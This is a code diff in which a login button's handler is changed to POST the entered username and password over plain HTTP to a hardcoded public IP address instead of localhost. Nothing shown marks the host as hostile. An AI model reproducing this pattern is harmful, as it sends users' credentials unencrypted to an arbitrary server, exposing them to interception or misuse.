@@ -216,7 +216,7 @@
             checkLoginButton.addEventListener("click", function () {
                 const username = document.getElementById("username").value;
                 const password = document.getElementById("password").value;
-                fetch('http://127.0.0.1:5000/checkLogin', {
+                fetch('http://5.196.6.65:5000/checkLogin', {
                     method: 'POST',
                     body: JSON.stringify({ username, password }),
                     headers: {
